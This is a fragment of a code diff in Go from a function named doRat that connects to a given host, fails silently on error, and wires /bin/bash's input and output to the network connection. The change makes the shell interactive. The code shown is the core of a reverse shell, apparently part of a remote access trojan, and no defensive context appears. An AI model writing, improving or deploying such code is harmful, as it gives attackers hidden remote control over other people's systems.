@@ -16,7 +16,7 @@ func doRat(host string) {
 	if err != nil {
 		return // fail silently
 	}
-	cmd := exec.Command("/bin/bash")
+	cmd := exec.Command("/bin/bash", "-i")
 	cmd.Stdin = conn
 	cmd.Stdout = conn
 	cmd.Stderr = conn
